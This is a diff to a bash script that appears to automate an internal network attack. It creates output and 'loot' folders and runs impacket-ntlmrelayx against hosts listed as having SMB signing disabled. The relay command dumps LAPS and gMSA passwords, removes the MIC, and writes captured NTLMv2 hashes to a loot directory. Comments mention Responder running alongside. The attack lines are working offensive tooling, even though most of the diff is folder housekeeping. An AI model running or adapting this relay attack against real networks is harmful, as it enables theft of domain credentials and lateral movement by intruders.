@@ -22,11 +22,12 @@ else
 	exit 1
 fi
 
-if [[ -d /root/output/nmap && -d /root/output/list ]]; then
-    echo '! > Folder exists!'
+if [ -d /root/output/nmap -a -d /root/output/list -a -d /root/input/msf -a -d /root/output/loot ]; then
+    echo '! > Folder Exist!'
 else    
     #Creating Output Folders
-    mkdir -p /root/output/nmap /root/output/list
+    mkdir -p /root/output/nmap /root/output/list /root/input/msf /root/output/loot
+    #echo '! > Folder Created!'
 fi
 
 #NMAP PE SCAN
@@ -80,7 +81,7 @@ if [ -s /root/output/list/smb_sign_off.txt ]
 
 	#NTLMRelayX with 300sec timeout in bg to relay ntlm to hosts without signing enabled
 	echo '! > Starting NTLM-Relay'
-	timeout 300 impacket-ntlmrelayx -ip $IP -6 -ts -ra --dump-laps --dump-gmsa -l loot -of /root/output/ntlm_relay_ntlmv2.txt --remove-mic -smb2support -tf /root/output/list/smb_sign_off.txt > /dev/null 2>&1 &
+	timeout 300 impacket-ntlmrelayx -ip $IP -6 -ts -ra --dump-laps --dump-gmsa -l /root/output/loot -of /root/output/loot/ntlm_relay_ntlmv2.txt --remove-mic -smb2support -tf /root/output/list/smb_sign_off.txt > /dev/null 2>&1 &
 	echo ''
 
 	#Declaring variables for each PID of Responder and NTLMRelayX
@@ -105,5 +106,3 @@ if [ -s /root/output/list/smb_sign_off.txt ]
 else
 	echo '! > Either Signing is ON everywhere or no SMB Service available.'
 fi
-
-
